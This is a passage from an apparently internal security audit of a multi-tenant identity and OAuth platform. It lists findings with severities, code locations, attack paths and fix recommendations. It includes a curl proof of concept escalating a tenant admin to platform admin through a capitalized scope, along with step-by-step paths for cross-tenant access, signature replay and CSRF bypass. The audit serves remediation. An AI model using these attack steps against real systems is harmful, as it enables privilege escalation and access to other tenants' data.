- `services/auth/internal/service/auth_service.go:660-670` — `RecordFailedLogin`
- `services/auth/internal/service/auth_service.go:620-627` — `IsAccountLocked`

**Root cause:**

The lockout key is `ggid:lockout:{tenantID}:{identifier}` where `identifier` is the raw input string. A user who can be identified by both `username` and `email` has **two separate lockout counters**:

```
ggid:lockout:tenant:johndoe      → counter A
ggid:lockout:tenant:john@ corp.com  → counter B
```

An attacker can try 5 passwords with `johndoe`, then switch to `john@corp.com` and try 5 more — doubling the brute-force window.

The `RecordFailedLogin` is called from the local credential provider (not shown in the audit scope), but the key construction uses the raw `identifier` parameter. The `VerifyCredentials` method (line 112) passes the username to the provider chain, and the lockout check is done inside the provider — using the username as identifier.

**Impact:** Brute-force protection can be circumvented by alternating between username and email variants. Limited impact since `CheckBruteForce` (sliding window) provides additional protection per-IP and per-username.

---

### P3-9F: Bulk Import Has No Rate Limit Per Tenant

**Severity:** P3 (Low)
**CVSS:** 4.3 (AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:N/A:L)

**Location:**
- `services/identity/internal/server/bulk_import.go:59-166` — `handleBulkImport`

**Root cause:**

Bulk import allows up to 10,000 users per request (line 82-84: `if len(req.Users) > 10000`) with no rate limit per tenant. A tenant admin can:
- Submit 10,000 users per request
- Submit requests in rapid succession (only the generic gateway APILimit applies)
- Each user creation is synchronous (line 138: `h.svc.CreateUser` in a loop)

Additionally, `RoleID` from the import payload is directly inserted (line 152-158):
```go
if user.RoleID != "" {
    _, _ = h.svc.Pool().Exec(r.Context(),
        `INSERT INTO user_roles (user_id, role_id) VALUES ($1, $2) ON CONFLICT DO NOTHING`,
        createdUser.ID, roleUUID)
}
```
This allows a tenant admin to assign **any role** to imported users, including roles with elevated permissions. There's no validation that the RoleID belongs to the same tenant or that the admin has permission to assign that role.

**Impact:** Resource exhaustion via rapid bulk imports. Privilege escalation within a tenant if admin can assign any role ID (including platform roles if they exist in the same DB).

---

### Summary for Attack Surface #9

| Finding | Severity | Status |
|---------|----------|--------|
| P1-9A: Password reset email bombing (no rate limit on forgot-password) | P1 | Confirmed |
| P2-9B: Registration creates user without email verification gate | P2 | Confirmed |
| P2-9C: Gateway rate limiter missing critical auth endpoints | P2 | Confirmed |
| P2-9D: Impersonation has no audit log, tenant bypass when req.TenantID empty | P2 | Confirmed |
| P3-9E: Lockout counter bypassable via username/email variants | P3 | Confirmed |
| P3-9F: Bulk import no per-tenant rate limit, unchecked role assignment | P3 | Confirmed |

**Positive findings (things done right):**
- Registration struct (`registerRequest`) does NOT include role/scope/is_admin fields — no mass assignment
- Default role is hardcoded to `"user"` — no admin escalation via registration
- Password reset token uses `GetDel` (atomic consume) — no TOCTOU race
- Password reset token is bound to `tenantID:userID` — properly scoped
- Password reset revokes all sessions + clears trusted devices — good session invalidation
- Impersonation blocks nested impersonation (`X-Impersonated` header check)
- Impersonation requires `tenant:admin` or `platform:admin` scope
- Cross-tenant impersonation requires `platform:admin`
- Lockout has dual-dimension: IP-based + username-based sliding window
- Bulk import has 10,000 user cap per request
- Pagination capped at 1,000 per page

---

## Round 6 — BOLA/IDOR Audit (2025-07-31)

### R6-1: ITDR Detection by ID — Cross-Tenant BOLA (P1)

**Severity:** P1 (High)
**CVSS:** 7.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N)

**Affected endpoints:**
- `GET /api/v1/audit/itdr/detections/{id}` — read any tenant's detection
- `POST /api/v1/audit/itdr/detections/{id}/acknowledge` — acknowledge any tenant's detection
- `POST /api/v1/audit/itdr/detections/{id}/resolve` — resolve/dismiss any tenant's detection

**Root cause:**

`handleITDRDetectionByID` (itdr_handler.go:83-107) calls `s.itdrRepo.GetDetection(r.Context(), id)` with only the detection UUID — **no tenant_id parameter**. The repository query at itdr_repo.go:195-198:

```sql
SELECT ... FROM itdr_detections WHERE id = $1
```

has no `tenant_id` filter. Compare with `ListDetections` (itdr_repo.go:118) which correctly uses `WHERE tenant_id = $1`.

Similarly, `handleITDRAcknowledge` (line 109-132) and `handleITDRResolve` (line 134-167) call `UpdateStatus(r.Context(), id, status)` which also lacks tenant filtering (itdr_repo.go:209-211):

```sql
UPDATE itdr_detections SET status = $2 WHERE id = $1
```

**Attack path:**
1. Attacker is a tenant admin for Tenant A with valid JWT and `tenant:admin` scope
2. Attacker guesses or enumerates a detection UUID (UUIDs may be exposed in audit logs, notifications, or predictable from gen_random_uuid)
3. `GET /api/v1/audit/itdr/detections/{victim-detection-uuid}` returns the full detection detail including `actor_id`, `severity`, `title`, `detail`, `event_ids` from Tenant B
4. `POST /api/v1/audit/itdr/detections/{victim-detection-uuid}/resolve` dismisses Tenant B's security alert, blinding their SOC

**Impact:**
- **Information disclosure**: Cross-tenant read of ITDR threat detections (actor IDs, rule IDs, event details)
- **Integrity violation**: Cross-tenant acknowledge/resolve of detections — an attacker can suppress another tenant's security alerts

**Code location:**
- `services/audit/internal/server/itdr_handler.go:83-107` (handleITDRDetectionByID)
- `services/audit/internal/server/itdr_handler.go:109-132` (handleITDRAcknowledge)
- `services/audit/internal/server/itdr_handler.go:134-167` (handleITDRResolve)
- `services/audit/internal/repository/itdr_repo.go:190-201` (GetDetection — missing tenant_id)
- `services/audit/internal/repository/itdr_repo.go:204-213` (UpdateStatus — missing tenant_id)

**Fix recommendation (not applied — audit only):**
- Pass `getTenantID(r)` to `GetDetection` and `UpdateStatus`
- Add `AND tenant_id = $2` to both SQL queries
- Return 404 when detection exists but belongs to different tenant

---

### Round 6 — Areas Verified Clean

The following endpoints were audited and found to have proper tenant isolation:

1. **SCIM token CRUD** (`scim_token_handler.go`): List by tenant, revoke with `tenant_id = $2` filter, admin scope check on mutations
2. **Device posture** (`device_posture.go`): `GetByDevice` filters by `tenant_id = $1`
3. **Policy CRUD** (`policy/internal/server/http.go`): `handlePolicyByID` checks `policy.TenantID != tid` for GET/PUT/DELETE, service layer uses `tenant.FromContext`
4. **Policy delegation** (`delegation_handler.go`): Admin scope check, tenant from header, delegator from `X-User-ID` not body
5. **OAuth client CRUD** (`oauth/internal/server/server.go:1740`): All operations go through `tenant.FromContext` in service layer
6. **Tenant suspend/activate** (`tenant_action_handler.go`): `platform:admin` scope required
7. **Tenant detail/delete** (`tenant_handlers.go`): `tenantBoundaryOK` enforces same-tenant or platform:admin
8. **forceLogout / sessionLimit** (`auth/internal/server/http.go:3153`): Admin scope + cross-tenant requires platform:admin
9. **SCIM searchUsers** (`scim/handler.go:180`): `injectTenant` prefers SCIM token's tenant context over header
10. **API key auth** (`apikey.go:40-47`): Validates X-Tenant-ID header matches API key's tenant
11. **Gateway Director** (`router.go:268`): Strips client-supplied `X-Tenant-ID` and re-derives from JWT-verified context
12. **Gateway X-Scopes** (`router.go:244`): Strips and re-derives from JWT claims

---

## Round 6 — Authentication Bypass Deep Dive

### R6-1: Internal Auth HMAC Does Not Bind to Request Method/Path/Body (P1)

**Severity:** P1 (High)
**CVSS:** 7.5 (AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H)

**Root cause:**

The internal auth HMAC signature payload is constructed as:
```
payload := service + "|" + tsStr + "|" + reqID
```
at:
- `pkg/middleware/internal_auth.go:107` (HTTP middleware)
- `pkg/middleware/grpc_recovery.go:79` (gRPC interceptor)

The signature only binds the **service name**, **timestamp**, and **request ID**. It does NOT include:
- HTTP method (GET/POST/PUT/DELETE)
- Request path/URL
- Request body
- gRPC method name

This means an attacker who captures a single valid internal auth signature (e.g. via SSRF, log exposure, or network sniffing) can **replay it against any internal endpoint** with a different method, path, or body within the 120-second replay window.

**Attack path:**
1. Attacker captures one valid internal auth header set (X-Internal-Service, X-Internal-Timestamp, X-Internal-Signature, X-Request-ID) — e.g. from a log file, SSRF, or network exposure
2. Within 120 seconds, attacker sends a different request to any internal endpoint (e.g. `POST /api/v1/org/tenants/suspend`) with the captured headers
3. The signature validates because the payload is identical (same service+ts+reqID)
4. The request executes with the captured service identity but a different body/path

**Code location:**
- `pkg/middleware/internal_auth.go:107` — `payload := service + "|" + tsStr + "|" + reqID`
- `pkg/middleware/internal_auth.go:136` — `SignInternalRequest` also doesn't include path/method/body
- `pkg/middleware/grpc_recovery.go:79` — gRPC interceptor same payload
- `pkg/middleware/internal_auth.go:147` — `ComputeSignature` same payload

**Note:** This is a known limitation — the replay window (120s) provides partial protection, and the reqID should ideally be unique per request. However, if reqID is predictable or reused, the signature becomes a bearer token for 120 seconds.

**Fix recommendation (not applied — audit only):**
- Include request method + path in the HMAC payload: `payload := service + "|" + method + "|" + path + "|" + tsStr + "|" + reqID`
- For gRPC: include `info.FullMethod` in the payload
- Optionally hash the request body for full binding

---

### R6-2: Old `/oauth/logout` Endpoint Accepts Any Access Token as Logout Token (P1)

**Severity:** P1 (High)
**CVSS:** 6.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:H)

**Root cause:**

The old `/oauth/logout` endpoint (`server.go:1024`) uses `oauthSvc.ParseAccessToken(logoutToken)` to validate the logout token:
```go
// server.go:1038
claims, err := oauthSvc.ParseAccessToken(logoutToken)
```

`ParseAccessToken` only verifies the JWT signature, issuer, and audience — it does NOT validate:
- The `events` claim (must contain `http://schemas.openid.net/event/backchannel-logout`)
- The absence of `nonce` (spec requires no nonce in logout tokens)
- The `sub` or `sid` claim presence

In contrast, the newer `ParseBackchannelLogoutToken` (`oauth_service.go:3391`) correctly validates all of these.

**Attack path:**
1. Attacker has any valid access token for the OAuth server (their own token, a leaked token, etc.)
2. Attacker sends `POST /oauth/logout` with `logout_token=<any_valid_access_token>`
3. `ParseAccessToken` succeeds — the token has a valid signature and correct issuer
4. The handler extracts `sub` from the token and calls `RevokeToken(logoutToken)` and processes logout for that user
5. If the attacker can obtain/guess another user's access token, they can force that user's logout

**Impact:** Primarily a DoS vector — forcing arbitrary users to log out. The attacker needs a valid access token of the target user (not just any token), since `sub` in the attacker's own token would only log out themselves. However, the lack of `events` claim validation means the endpoint violates the OIDC Back-Channel Logout spec and accepts tokens that should be rejected.

**Code location:**
- `services/oauth/internal/server/server.go:1038` — `ParseAccessToken` used instead of `ParseBackchannelLogoutToken`
- `services/oauth/internal/service/oauth_service.go:3391` — `ParseBackchannelLogoutToken` exists but is not used by old endpoint

**Fix recommendation (not applied — audit only):**
- Replace `ParseAccessToken` with `ParseBackchannelLogoutToken` in the old `/oauth/logout` handler
- Or remove the old endpoint entirely if `/api/v1/oauth/backchannel-logout` supersedes it

---

### R6-3: MCP Server ParseUnverified Bypass When JWKS URL Not Configured (P2, NEEDS-VERIFY)

**Severity:** P2 (Medium) — contingent on production deployment configuration

**Root cause:**

The MCP server's JWT validation has a dev bypass at `mcp_server.go:131-133`:
```go
if isRS256 && s.jwksURL == "" {
    // Dev bypass: RS256 token without JWKS — parse claims without signature.
    parser := jwt.NewParser(jwt.WithoutClaimsValidation())
    _, _, err = parser.ParseUnverified(tokenStr, &claims)
}
```

When `s.jwksURL` is empty AND the token has an RS256 algorithm header, the server accepts **any forged JWT** without signature verification. The `alg` header is checked via a string comparison on the base64-decoded header, not via the JWT library's parser.

Additionally, the MCP server has a broader dev bypass at line 89:
```go
if len(s.jwtSecret) == 0 {
    log.Printf("MCP WARNING: no JWT_SECRET configured — allowing unauthenticated request")
    next(w, r)
    return
}
```

**NEEDS-VERIFY:** Whether the MCP service is deployed with `JWT_SECRET` and `JWKS_URL` configured in production. If either is missing, the MCP server accepts unauthenticated/forged-token requests. The MCP service is behind the gateway at `/api/v1/mcp` (gateway config), so gateway-level JWT auth should protect it — but direct access to port 9060 would bypass the gateway.

**Code location:**
- `services/mcp/internal/server/mcp_server.go:131-133` — ParseUnverified bypass
- `services/mcp/internal/server/mcp_server.go:89-92` — No JWT_SECRET bypass
- `services/mcp/cmd/main.go:31` — Standalone HTTP server on port 9060

---

### R6-4: ITDR Dashboard Endpoints Lack Tenant Isolation (P2)

**Severity:** P2 (Medium)

**Root cause:**

The ITDR dashboard endpoints read from in-memory global maps without calling `resolveValidatedTenant` or checking `X-Tenant-ID`:

- `handleITDRTimelineFeed` (itdr_advanced_handler.go:274) — iterates all `itdrIncidents` regardless of tenant
- `handleITDRThreatHeatmap` (itdr_advanced_handler.go:309) — aggregates all incidents globally
- `handleITDRKillChainSummary` (itdr_advanced_handler.go:239) — no tenant filter
- `handleITDRKillChain` (itdr_advanced_handler.go:188) — looks up incident by ID without tenant check
- `handleITDRPlaybooks` (itdr_advanced_handler.go:206) — global playbook CRUD, no tenant isolation

**Attack path:**
1. Any authenticated user in Tenant A calls `GET /api/v1/audit/incident-timeline`
2. Response includes timeline events from ALL tenants' incidents
3. Similarly for heatmap, kill-chain summary, and individual incident lookups

**Impact:** Cross-tenant information disclosure of security threat detection data. Any tenant can see other tenants' security incidents, detection timelines, and threat heatmaps.

**Code location:**
- `services/audit/internal/server/itdr_advanced_handler.go:274-305` (timeline feed)
- `services/audit/internal/server/itdr_advanced_handler.go:309-339` (heatmap)
- `services/audit/internal/server/itdr_advanced_handler.go:239-273` (kill chain summary)
- `services/audit/internal/server/itdr_advanced_handler.go:188-203` (per-incident kill chain)
- `services/audit/internal/server/itdr_advanced_handler.go:206-235` (playbooks CRUD)

**Fix recommendation (not applied — audit only):**
- Add `resolveValidatedTenant` call to each handler
- Filter `itdrIncidents` by tenant_id
- For playbooks, scope by tenant or require platform:admin

---

### R6-5: Internal Auth Whitelist Uses Prefix Matching Without Boundary (P2, NEEDS-VERIFY)

**Severity:** P2 (Medium)

**Root cause:**

`InternalAuth` whitelist matching at `internal_auth.go:72`:
```go
if r.URL.Path == path || strings.HasPrefix(r.URL.Path, path) {
    next.ServeHTTP(w, r)
    return
}
```

`HasPrefix` matching without a trailing slash boundary means a whitelist entry like `/healthz` would also match `/healthz-admin`, `/healthz/sensitive`, etc. If any whitelisted path is a prefix of a sensitive endpoint, that endpoint would bypass internal auth.

**NEEDS-VERIFY:** Whether any whitelist entry is a prefix of a non-public endpoint in actual deployment configurations.

**Code location:**
- `pkg/middleware/internal_auth.go:72` — prefix matching without boundary

**Fix recommendation (not applied — audit only):**
- Use exact match or ensure trailing slash: `r.URL.Path == path || strings.HasPrefix(r.URL.Path, path+"/")`

---

### Round 6 — Areas Verified Clean

1. **ExtractJWTClaims Priority 1 vs Priority 2** (`jwt_claims.go`): Context-based claims (Priority 1) correctly take precedence over unsigned JWT header parsing (Priority 2). API key fast-path does not set claimsKey, so it falls through to Priority 2 — but Priority 2 only extracts scopes from the verified JWT header, not from arbitrary client input. The gateway strips and re-derives X-Scopes from verified JWT claims (router.go:244), so Priority 2 injection of X-Scopes via forged JWT on public paths is mitigated at the gateway level.

2. **JWT algorithm whitelist** (`pkg/crypto/alg_whitelist.go`): `isSupportedSigningMethod` delegates to `pkgcrypto.IsSupportedAlg` which whitelists RS256, RS384, RS512, ES256, ES384, ES512. `alg: none` and `alg: HS256` with RSA key are not in the whitelist. `jwt.Parse` keyfunc returns error for unsupported methods.

3. **Backchannel logout token verification** (`oauth_service.go:3391`): `ParseBackchannelLogoutToken` correctly verifies signature, checks `events` claim, rejects `nonce`, and has jti replay prevention via Redis SetNX. (But see R6-2 — the old endpoint doesn't use this function.)

4. **Token introspection auth** (`server.go:1198`): Requires client authentication via Basic auth, form credentials, or Bearer token with `aud=introspection`. Regular user access tokens (aud=ggid) cannot introspect other tokens. Follows RFC 7662 §2.1.

5. **Org tenant action endpoints** (`tenant_action_handler.go`): `handleSuspendTenant` and `handleActivateTenant` both require `platform:admin` scope via `hasScope(r.Header.Get("X-Scopes"), "platform:admin")`. X-Scopes is stripped and re-derived by gateway from verified JWT.

6. **gRPC internal auth** (`grpc_recovery.go:53`): `GRPCInternalAuthUnary` interceptor enforces HMAC signature on every gRPC call. Fail-closed when secret is configured. (But see R6-1 — payload doesn't bind to gRPC method.)

7. **Gateway Director header injection** (`router.go:268`): Strips client-supplied `X-Tenant-ID`, `X-Scopes`, `X-User-ID` and re-derives from verified JWT context. Prevents header injection via proxy.Director.

8. **Introspection information disclosure**: `IntrospectToken` returns active status, client_id, scope, exp, iat, sub, aud — standard RFC 7662 fields. No excessive sensitive information (no token secrets, no user PII beyond sub).

---

## Attack Surface #2: Authorization Logic Vulnerences (Round 6)

### P0-6: filterSafeScopes Case-Sensitivity Bypass — Tenant Admin → Platform Admin Escalation

**Severity:** P0 (Critical)
**CVSS:** 9.1 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)

**Affected code:**
- `services/oauth/internal/service/oauth_service.go:1508-1522` — `filterSafeScopes`
- `services/oauth/internal/service/oauth_service.go:181` — `CreateClient` calls `filterSafeScopes`
- `services/oauth/internal/service/oauth_service.go:347` — `UpdateClientMetadata` calls `filterSafeScopes`
- `services/oauth/internal/service/grant_client_credentials.go:47-52` — `ClientCredentials` grant uses `intersectScopes` (also case-sensitive)

**Root Cause:**

`filterSafeScopes` performs case-sensitive prefix matching:
```go
func filterSafeScopes(scopes []string) []string {
    var filtered []string
    for _, sc := range scopes {
        if sc == "admin" ||
            strings.HasPrefix(sc, "platform:") ||   // case-sensitive!
            strings.HasPrefix(sc, "tenant:") {       // case-sensitive!
            continue
        }
        filtered = append(filtered, sc)
    }
    return filtered
}
```

The string `"Platform:admin"` does NOT match `strings.HasPrefix(sc, "platform:")` because Go's `strings.HasPrefix` is byte-level case-sensitive. The scope `"Platform:admin"` passes through the filter unchanged.

Meanwhile, all downstream consumers use case-insensitive matching:
- `hasAdminScope` (rbac.go:212): `strings.ToLower(sc)` → matches `"platform:admin"`
- `isPlatformTenant` (router.go:862): `strings.EqualFold(sc, "platform:admin")` → matches
- `hasPlatformAdminScope` (rbac.go:225): `strings.EqualFold(sc, "platform:admin")` → matches

**Attack Path:**

1. Tenant admin calls `POST /api/v1/oauth/clients` (CreateClient) with scopes `["openid", "Platform:admin"]`
2. `filterSafeScopes` does NOT filter `"Platform:admin"` (case mismatch on `HasPrefix`)
3. Client is stored with `"Platform:admin"` scope
4. M2M client requests `client_credentials` grant with scope `["openid", "Platform:admin"]`
5. `intersectScopes` is case-sensitive — but since client's stored scopes include `"Platform:admin"`, the intersection passes
6. JWT is issued with `scope: "openid Platform:admin"` and `permissions: ["openid", "Platform:admin"]`
7. Gateway `hasAdminScope` lowercases scope → `"platform:admin"` → matches → **admin access granted**
8. Gateway `isPlatformTenant` uses `EqualFold` → matches → `hasPlatform = true` → **platform admin access granted**
9. Attacker now has full platform admin access from a tenant admin context

**PoC:**

```bash
# Step 1: Tenant admin creates OAuth client with capitalized scope
curl -X POST https://gateway/api/v1/oauth/clients \
  -H "Authorization: Bearer <tenant_admin_jwt>" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "legit-app",
    "type": "confidential",
    "grant_types": ["client_credentials"],
    "scopes": ["openid", "Platform:admin"]
  }'
# Response: client_id, client_secret — scope "Platform:admin" is stored

# Step 2: M2M token request
curl -X POST https://gateway/api/v1/oauth/token \
  -d "grant_type=client_credentials" \
  -d "client_id=<client_id>" \
  -d "client_secret=<client_secret>" \
  -d "scope=openid Platform:admin"
# Response: access_token with scope "openid Platform:admin"

# Step 3: Access platform-only endpoints
curl https://gateway/api/v1/admin/audit/global \
  -H "Authorization: Bearer <m2m_token>"
# 200 OK — platform admin access granted
```

**Verified:** Go test confirms `"Platform:admin"` passes `filterSafeScopes`, survives `intersectScopes`, and triggers `hasAdminScope` and `isPlatformTenant`.

**Fix:** Use case-insensitive matching in `filterSafeScopes`:
```go
lower := strings.ToLower(sc)
if lower == "admin" ||
    strings.HasPrefix(lower, "platform:") ||
    strings.HasPrefix(lower, "tenant:") {
    continue
}
```

### P2-12: isPlatformTenant Still Only Checks Scope — No tenant_id Verification

**Severity:** P2 (NEEDS-VERIFY — design risk confirmed but not independently exploitable without P0-6)
**Code:** `services/gateway/internal/router/router.go:860-877`

`isPlatformTenant` is determined solely by checking whether the JWT contains a `platform:admin` scope (case-insensitive) or a `platform:admin` role key. There is no verification that the JWT's `tenant_id` claim equals the platform tenant ID (typically `uuid.Nil` or a configured platform tenant UUID).

This means any token with `platform:admin` scope — regardless of which tenant issued it — gets `isPlatformTenant = true`, which in turn sets `hasPlatform = true`, granting access to all `platformOnlyPaths`.

The comment at line 855 says "The tenant boundary enforcement in JWTAuth prevents cross-tenant privilege escalation" — but this relies on JWTAuth properly validating `tenant_id`. If `filterSafeScopes` is bypassed (P0-6), a tenant-issued token can carry `Platform:admin` scope and the `isPlatformTenant` check will accept it.

**Status:** This is the amplifier for P0-6. If P0-6 is fixed, this becomes defense-in-depth. But if any other path injects `platform:admin` scope into a non-platform-tenant JWT, this check alone is insufficient.

### P2-13: /api/v1/mcp and /api/v1/scim Not in Admin Path Lists

**Severity:** P2 (NEEDS-VERIFY)
**Code:**
- `services/gateway/internal/middleware/rbac.go:36-70` — `defaultAdminPrefixes`
- `services/gateway/internal/router/router.go:801-821` — `adminOnlyPaths`

The MCP service (`/api/v1/mcp` → `MCP_SERVICE_URL`) and SCIM API (`/api/v1/scim` → `USERS_SERVICE_URL`) are configured as gateway routes but are NOT listed in either `defaultAdminPrefixes` or `adminOnlyPaths`.

For SCIM: `/scim/v2/` is in `publicPaths` (skips JWT entirely, uses its own bearer token). But `/api/v1/scim` is NOT in any path list — it falls through to the default route, which means any authenticated user can access it without admin scope check.

For MCP: `/api/v1/mcp` is not in any path list at all. If the MCP service exposes admin-level operations, they would be accessible to any authenticated user.

**Risk:** If SCIM or MCP endpoints perform tenant-scoped admin operations (user provisioning, MCP server config), any authenticated user could call them without the admin scope gate.

### P2-14: /api/v1/admin/threats Not in defaultAdminPrefixes

**Severity:** P2 (Info)
**Code:** `services/gateway/internal/middleware/rbac.go:36-70`

The ITDR/threats endpoints (`/api/v1/admin/threats/dashboard`) are in `platformOnlyPaths` (router.go:827) but NOT in `defaultAdminPrefixes` (rbac.go:36-70). This means:

- `checkRouteScope` (router.go) correctly blocks non-platform-admin users via `platformOnlyPaths`
- But `RequireAdminScope` middleware's static fallback (`isAdminEndpoint`) does NOT gate `/api/v1/admin/threats` because it's not in `defaultAdminPrefixes`
- The dynamic RBAC resolver would need a DB rule to cover it

Since `RequireAdminScope` runs before `checkRouteScope`, if the dynamic resolver has no data AND the static fallback doesn't list `/api/v1/admin/threats`, the middleware passes the request through. Then `checkRouteScope` catches it. This is defense-in-depth but the first layer is missing coverage.

### Info-6: DCR Response Leaks Unfiltered Scope

**Severity:** Info
**Code:** `services/oauth/internal/service/dcr.go:131`

The DCR response returns `Scope: req.Scope` (the original request scope) instead of the filtered `scopes` variable. While the stored client scopes are correctly filtered, the response tells the caller what they requested, which could leak information about blocked scopes to attackers probing for valid scope strings.

### Info-7: apiKeyHasWriteAccess Dead Code Still Present

**Severity:** Info
**Code:** `services/gateway/internal/middleware/middleware.go:966-995`

The function was previously flagged as dead code (Info-1 in this report). It has since been updated with actual logic (fail-closed for empty scopes, admin scope bypass, read/write method checks). However, no callers reference this function — it remains dead code with security-relevant logic that could mislead future developers into thinking API key scope enforcement is active.

### Verified Safe: RBAC Dynamic Resolver Tenant Isolation

**Code:** `services/gateway/internal/middleware/rbac_dynamic.go:375`

The dynamic RBAC resolver correctly enforces tenant isolation at line 375:
```go
if row.TenantID != claims.TenantID {
    continue
}
```
This prevents a role named "Administrator" created in tenant B from matching grants for tenant A's users. The `hasAdminScope` superuser bypass (line 348) is scope-based and case-insensitive, so it is NOT vulnerable to the P0-6 case-sensitivity bypass on its own — but the P0-6 bypass injects the scope into the JWT itself, so the superuser bypass would also accept it.

---

## Attack Surface #3 (Round 6): OAuth/OIDC Flow — Re-audit

### P2-3: Token Endpoint State CSRF Validation Bypass — NOT FIXED

**Severity:** P2 (Medium)
**Code:** `services/oauth/internal/server/server.go:775-784`

**Status:** Previously reported as P2-3. **Not fixed.**

The token endpoint state validation remains conditional on the state parameter being present:

```go
stateParam := r.FormValue("state")
if stateParam != "" {
    if !oauthSvc.ValidateState(clientID, stateParam) {
        writeJSON(w, http.StatusBadRequest, ...)
        return
    }
}
```

An attacker who omits the `state` parameter entirely in the token exchange request skips CSRF validation. The authorization code is consumed and a token is issued without any CSRF check. Since the attacker can initiate the authorize flow themselves (or intercept it), they can exchange the code at the token endpoint without needing to know the state value.

**Attack path:**
1. Attacker initiates `/oauth/authorize` with their own client_id and redirect_uri
2. Attacker receives the authorization code (e.g., via redirect interception or cooperation with victim)
3. Attacker calls `POST /oauth/token` with `grant_type=authorization_code&code=<code>&redirect_uri=<uri>&client_id=<cid>` — **no state parameter**
4. State validation is skipped entirely; token is issued

**Fix:** State validation must be mandatory when the authorization request included a state. The authorize endpoint should record whether state was provided, and the token endpoint must reject token exchanges that omit state when it was expected.

### P2-4: State Not Bound to User Session — NOT FIXED

**Severity:** P2 (Medium)
**Code:** `services/oauth/internal/service/grant_authorization_code.go:108-119`, `services/oauth/internal/service/oauth_service.go:1308`

**Status:** Previously reported as P2-4. **Not fixed.**

State is stored and validated purely by `clientID:state` key:
```go
stateKey := fmt.Sprintf("oauth:state:%s:%s", req.ClientID, req.State)
stateStore.Store(stateKey, time.Now().Add(stateTTL))
```

And validated:
```go
stateKey := fmt.Sprintf("oauth:state:%s:%s", clientID, state)
```

No user session ID, IP address, or browser fingerprint is included in the state key. An attacker who knows or can guess the state value (e.g., if it's a weak random value) can replay it from a different browser/session. The state is also not bound to the authorization code itself — any valid state for the same client can be used with any code.

**Fix:** Bind state to the user session (e.g., include session cookie hash or user agent hash in the state key). The state should also be bound to the specific authorization code.

### NEEDS-VERIFY: Device Authorization — No Client Existence Validation

**Severity:** NEEDS-VERIFY (Potential P2)
**Code:** `services/oauth/internal/service/grant_device.go:17-73`

`CreateDeviceAuthorization` has a comment claiming "SECURITY (R24 P1): Validate client_id exists and tenant is valid" (line 35), but the actual validation only checks:
```go
if req.ClientID == "" {
    return nil, fmt.Errorf("client_id is required")
}
if req.TenantID == uuid.Nil {
    return nil, fmt.Errorf("tenant_id is required")
}
```

No database lookup via `clientRepo.GetClientByID` or any other method is performed. The `clientRepo` is not referenced anywhere in `grant_device.go`. This means:
- A non-existent client_id can be used to create device codes
- A disabled client can still initiate device flow
- The device code will be stored and pollable, and when approved, `issueDeviceAccessToken` will issue a token for the specified user — even though the client doesn't exist

The rate limit check (max 10 pending per client) uses `req.ClientID` matching but doesn't validate existence.

The token endpoint handler (server.go:829-855) does check `client.IsConfidential()` and verifies the secret, but `GetClient` is called earlier at line 758 and would reject non-existent clients at the token exchange step. So the risk is limited to creating orphaned device codes (DoS amplification) and social engineering (user approves a code for a fake client).

### NEEDS-VERIFY: Device Flow — No Scope Filtering

**Severity:** NEEDS-VERIFY (Potential P2)
**Code:** `services/oauth/internal/service/grant_device.go:46-55`, `services/oauth/internal/server/server.go:1920-1924`

The device authorization endpoint accepts arbitrary scopes from the request:
```go
scopeParam := r.FormValue("scope")
var scopes []string
if scopeParam != "" {
    scopes = strings.Split(scopeParam, " ")
}
```

These scopes are stored directly in the `DeviceCodeInfo` without `filterSafeScopes`:
```go
info := &DeviceCodeInfo{
    ...
    Scope: req.Scope,
    ...
}
```

When the device code is approved and a token is issued (line 134-149), the scope is included in the response but `issueDeviceAccessToken` (line 211-234) does **not** include scopes in the JWT claims — it only sets `iss, sub, aud, tenant_id, iat, exp, jti`. The scope string is only returned in the response body (line 148: `Scope: scopeStr`) but not embedded in the token.

This means the scope leak is limited to the response, not the token itself. However, a client receiving a token with admin scopes in the response may still attempt to use them, and downstream services may trust the response.

### NEEDS-VERIFY: CIBA login_hint User Resolution Without Validation

**Severity:** NEEDS-VERIFY (Potential P1)
**Code:** `services/oauth/internal/service/ciba.go:145-156`

The CIBA `BackchannelAuthentication` function resolves a user ID from `login_hint` without validating the user exists in the database:

```go
if req.LoginHint != "" {
    if u, err := uuid.Parse(req.LoginHint); err == nil {
        userID = u
    } else {
        userID = uuid.NewSHA1(uuid.NameSpaceOID, []byte("ciba:"+req.LoginHint))
    }
} else {
    userID = uuid.New()
}
```

If `login_hint` is a UUID, it's used directly as `userID` — no database check that this user exists or belongs to the tenant. When the CIBA request is approved (`ApproveCIBAAuth`, line 259-272), `PollCIBAToken` issues an access token for this `userID` (line 237: `s.issueAccessToken(entry.UserID, entry.TenantID, clientID, entry.Scope)`).

**Attack path (requires ApproveCIBAAuth to be exposed):**
1. Attacker calls `/api/v1/oauth/backchannel` with `login_hint=<victim_user_uuid>` and `client_id=<attacker_client>`
2. CIBA entry is created with the victim's user ID
3. If the approval endpoint is exposed (currently only called in tests), the attacker could approve their own request
4. Token is issued with `sub=<victim_user_uuid>` — impersonation

**Mitigating factor:** `ApproveCIBAAuth` is currently only called from test code — no HTTP endpoint exposes it. The CIBA flow appears incomplete (no approval endpoint wired up). If an approval endpoint is added later without proper authentication, this becomes a P1.

### Verified Safe: Token Exchange (RFC 8693) Security

**Code:** `services/oauth/internal/service/oauth_service.go:855-1058`

The RFC 8693 token exchange implementation is properly secured:
1. **Client authentication** — Confidential clients must verify secret (line 865-870)
2. **Subject token validation** — `parseAndValidateJWT` verifies JWT signature with service's own key (line 890)
3. **Revocation check** — `IsTokenRevoked` checks Redis, in-memory, and DB (line 902)
4. **ID token rejection** — Rejects subject tokens with `nonce` claim (line 907)
5. **Cross-tenant guard** — Subject token tenant must match requesting client tenant (line 920)
6. **Scope narrowing** — Requested scopes must be a subset of subject scopes (line 932-944)
7. **Actor token validation** — Actor token is JWT-validated and tenant-checked (line 969-977)
8. **Permission filtering** — Permissions and roles are filtered to match requested scopes (line 1003-1026)
9. **New JTI** — Fresh JTI is generated for the exchanged token (line 1034)

**Note:** `parseAndValidateJWT` does not explicitly validate the `iss` claim equals `s.issuer`, but signature verification with the service's own key implicitly ensures only self-issued tokens pass. This is defense-in-depth gap, not a vulnerability.

### Verified Safe: Backchannel Logout (RFC 8417)

